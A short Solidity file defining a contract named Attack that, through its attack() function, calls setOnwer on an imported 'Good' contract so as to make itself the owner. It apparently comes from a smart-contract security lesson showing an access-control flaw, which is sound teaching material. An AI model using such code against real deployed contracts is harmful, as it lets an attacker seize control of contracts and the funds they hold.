// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.19;

import "./Good.sol";

contract Attack {
    Good public good;

    constructor(Good _good) {
        good = Good(_good);
    }

    function attack() public {
        good.setOnwer(address(this));
    }
}
